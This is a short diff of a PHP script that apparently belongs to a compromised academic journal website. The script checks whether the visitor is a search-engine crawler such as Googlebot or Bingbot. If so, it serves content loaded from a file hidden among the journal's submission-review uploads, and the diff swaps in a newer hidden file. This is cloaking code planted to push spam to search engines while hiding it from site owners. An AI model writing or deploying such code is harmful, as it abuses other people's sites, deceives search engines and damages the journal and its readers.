@@ -15,7 +15,7 @@ function skylight_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/82-13-303-1-4-20240602";
+$bot = "/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/82-13-311-1-4-20240603";
 $file = skylight_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
